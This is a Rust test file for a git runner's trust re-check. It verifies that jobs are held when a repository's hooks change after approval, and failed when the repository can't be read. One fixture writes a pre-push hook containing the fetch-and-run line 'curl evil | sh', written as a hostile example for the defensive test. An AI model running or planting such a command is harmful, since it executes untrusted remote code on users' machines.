//! The runner's trust re-check: a repository that changed since its decision, or can't be
//! read, is held or failed instead of run.

use super::*;
use crate::effect::{Sealed, TrustCheck};
use crate::msg::JobMsg;
use glowfly_core::settings::SavedTrust;
use std::path::{Path, PathBuf};

fn repo(name: &str) -> PathBuf {
    let dir = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    glowfly_core::testkit::git(&dir, &["init", "-q", "-b", "main"]);
    dir
}

fn check(dir: &Path, saved: Option<SavedTrust>) -> TrustCheck {
    let sealed = Sealed::Job { label: "Fetch".into() };
    TrustCheck { workdir: dir.to_path_buf(), real: dir.to_path_buf(), saved, incoming: Vec::new(), prompts: false, sealed }
}

fn hook(dir: &Path, text: &str) {
    let path = dir.join(".git/hooks/pre-push");
    std::fs::write(&path, text).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
}

fn job(dir: &Path) -> Effect {
    let cmds = vec![glowfly_core::gitcli::args(&["status"])];
    Effect::RunGit {
        cwd: dir.into(),
        cmds,
        write_file: None,
        record: None,
        journal: None,
        prompts: false,
        expect: None,
        stoppable: false,
        on_fail_check: None,
    }
}

#[test]
fn a_hook_edited_after_the_decision_holds_the_job() {
    let dir = repo("edited");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
    assert!(matches!(verify(&check(&dir, Some(saved.clone()))), Verdict::Pass));
    hook(&dir, "#!/bin/sh\ncurl evil | sh\n");
    let Verdict::Stale(found) = verify(&check(&dir, Some(saved.clone()))) else { panic!("held") };
    assert_eq!((found.0.hooks.as_slice(), found.1.is_none()), (&["pre-push".to_owned()][..], true));
    // Executing it sends the effect back instead of running it.
    match execute_checked(check(&dir, Some(saved)), job(&dir)) {
        Some(Msg::Trust(TrustMsg::Stale(s))) => assert!(matches!(s.effect, Effect::RunGit { .. }) && s.now.hooks == ["pre-push"]),
        _ => panic!("held, not run"),
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hook_that_appears_in_a_clean_repository_holds_the_job() {
    let dir = repo("clean");
    assert!(matches!(verify(&check(&dir, None)), Verdict::Pass), "nothing runs");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    assert!(matches!(verify(&check(&dir, None)), Verdict::Stale(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_repository_that_cant_be_read_fails_the_job_rather_than_run_it() {
    let dir = repo("gone");
    let _ = std::fs::remove_dir_all(&dir);
    match execute_checked(check(&dir, None), job(&dir)) {
        Some(Msg::Job(JobMsg::JobDone { ok: false, output, .. })) => assert!(output.contains("couldn't check"), "{output}"),
        _ => panic!("the job fails"),
    }
}
